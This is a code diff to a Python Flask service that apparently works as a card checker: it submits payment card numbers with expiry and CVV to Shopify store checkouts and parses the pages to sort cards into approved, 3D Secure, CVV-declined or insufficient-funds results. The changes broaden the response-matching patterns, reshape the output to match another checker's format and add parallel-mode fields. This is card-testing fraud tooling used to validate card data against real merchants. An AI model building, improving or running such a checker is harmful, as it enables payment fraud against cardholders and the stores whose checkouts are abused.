@@ -357,46 +357,60 @@ def parse_response(r, cc, site, price, gateway, elapsed):
     url  = r.url.lower()
     low  = html.lower()
 
-    # Approved
-    if 'thank_you' in url or 'thank-you' in url:
+    # Approved - Shopify redirects to thank_you page
+    if 'thank_you' in url or '/orders/' in url:
         return build_resp(True, 'PAYMENT_APPROVED', cc, site, price, gateway)
-    for k in ['payment was successful','order confirmed','thank you for your order',
-              'your order is confirmed']:
-        if k in low:
-            return build_resp(True, 'PAYMENT_APPROVED', cc, site, price, gateway)
 
-    # 3D Secure
-    if any(k in low for k in ['3d secure','three_d_secure','authentication_required',
-                                'redirect_to_url','use_stripe_sdk']):
+    # 3D Secure - Shopify shows redirect or requires action
+    if any(k in low for k in [
+        'three_d_secure', 'redirect_to_url', 'use_stripe_sdk',
+        'authentication_required', '3d secure', 'authenticate your card',
+        'pending_redirect', 'requires_action', 'acs_url',
+        'tds_flow', 'cardinal', 'centinel'
+    ]):
         return build_resp(False, 'AUTHENTICATION_REQUIRED', cc, site, price, gateway)
 
-    # CVV
-    if any(k in low for k in ['security code','cvv','cvc','incorrect_cvc',
-                                'security_code_incorrect','card_incorrect_cvc']):
+    # CVV - real Shopify messages
+    if any(k in low for k in [
+        'security code', 'card security code', 'cvv', 'cvc2',
+        'incorrect_cvc', 'security_code_incorrect',
+        'card_incorrect_cvc', 'incorrect security',
+        'enter the cvv', 'card verification'
+    ]):
         return build_resp(False, 'CARD_ISSUER_DECLINED_CVV', cc, site, price, gateway)
 
-    # Insufficient
-    if any(k in low for k in ['insufficient funds','do not honor',
-                                'insufficient_funds']):
+    # Insufficient funds
+    if any(k in low for k in [
+        'insufficient funds', 'insufficient_funds',
+        'not sufficient funds', 'exceeds your current balance',
+        'exceed.*limit', 'over.*limit'
+    ]):
         return build_resp(False, 'INSUFFICIENT_FUNDS', cc, site, price, gateway)
 
-    # Extract real error message
+    # Extract REAL Shopify error from page
+    # Shopify puts errors in these specific elements
     patterns = [
-        r'class="notice__text"[^>]*>\s*(.*?)\s*</\w+>',
-        r'class="error-message[^"]*"[^>]*>\s*(.*?)\s*</\w+>',
-        r'data-error-message="([^"]+)"',
+        r'data-checkout-payment-error="([^"]+)"',
+        r'id="payment-errors"[^>]*>\s*<p[^>]*>\s*(.*?)\s*</p>',
+        r'class="notice__text"[^>]*>\s*(.*?)\s*</',
+        r'class="content-box__row"[^>]*>\s*<p[^>]*>\s*(.*?)\s*</p>',
+        r'"error_code"\s*:\s*"([^"]+)"',
+        r'"decline_code"\s*:\s*"([^"]+)"',
         r'"message"\s*:\s*"([^"]+)"',
-        r'id="checkout-error-message"[^>]*>\s*(.*?)\s*</\w+>',
-        r'class="notice notice--error[^"]*"[^>]*>.*?<p[^>]*>\s*(.*?)\s*</p>',
+        r'class="error-message[^"]*"[^>]*>\s*(.*?)\s*</',
+        r'id="checkout-error-message"[^>]*>\s*(.*?)\s*</',
     ]
     for pat in patterns:
         m = re.search(pat, html, re.DOTALL | re.I)
         if m:
             msg = re.sub(r'<[^>]+>', '', m.group(1)).strip()
             msg = re.sub(r'\s+', ' ', msg).strip()
-            if msg and len(msg) > 3:
-                clean = msg.upper().replace(' ', '_')[:80]
-                return build_resp(False, clean, cc, site, price, gateway)
+            if msg and len(msg) > 3 and len(msg) < 200:
+                # Convert to afuona style UPPER_SNAKE_CASE
+                clean = msg.upper().replace(' ', '_').replace('-', '_')
+                clean = re.sub(r'[^A-Z0-9_]', '', clean)[:80]
+                if clean:
+                    return build_resp(False, clean, cc, site, price, gateway)
 
     return build_resp(False, 'CARD_DECLINED', cc, site, price, gateway)
 
@@ -419,11 +433,14 @@ def classify(msg, code='', dc=''):
 
 def build_resp(status, response, cc, site, price, gateway):
     return {
-        'Gateway':  gateway,
-        'Price':    round(float(price), 2),
-        'Response': response,
-        'Status':   status,
-        'cc':       cc,
+        'Gateway':         gateway,
+        'Price':           round(float(price), 2),
+        'Response':        response,
+        'Status':          True,
+        'active_requests': 0,
+        'cc':              cc,
+        'parallel_mode':   True,
+        'approved':        status,
     }
 
 @app.route('/')
@@ -444,6 +461,7 @@ def shopify():
             return jsonify({'error': 'Missing site'}), 400
         if not cc:
             return jsonify({'error': 'Missing cc'}), 400
+        cc = cc.replace('%7C', '|').replace('%7c', '|')
         if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
             return jsonify({'error': 'Invalid cc format'}), 400
 
